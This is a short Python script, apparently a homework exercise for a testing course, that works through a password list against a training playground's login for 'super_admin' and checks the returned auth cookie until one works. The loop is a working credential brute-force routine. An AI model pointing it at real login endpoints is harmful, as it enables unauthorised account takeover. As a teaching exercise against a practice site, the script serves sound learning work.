import requests

"""Open file with list of passwords"""
f = open('../pass.txt', 'r')
arr = []
for line in f:
    line = line.replace("\n", '')
    arr.append(line)
f.close()

base_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_cookie_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

"""Trying passwords until password is correct"""
for password in arr:
    payload = {"login": "super_admin", "password": password}
    response = requests.post(base_url, data=payload)
    cookie_value = response.cookies.get("auth_cookie")
    cookies = {}
    if cookie_value is not None:
        cookies.update({"auth_cookie": cookie_value})
    response = requests.get(check_cookie_url, cookies=cookies)
    if response.text == "You are authorized":
        print("Your password is " + password)
        print(response.text)
        break

# payload = {"login": "super_admin", "password": "welcome"}
# response = requests.post(base_url, data=payload)
# print(response.text)
# print(response.status_code)
#
# cookie_value = response.cookies.get("auth_cookie")
# cookies={}
# if cookies is not None:
#     cookies.update({"auth_cookie":cookie_value})
# response = requests.get(check_cookie_url, cookies=cookies)
# print(response.text)
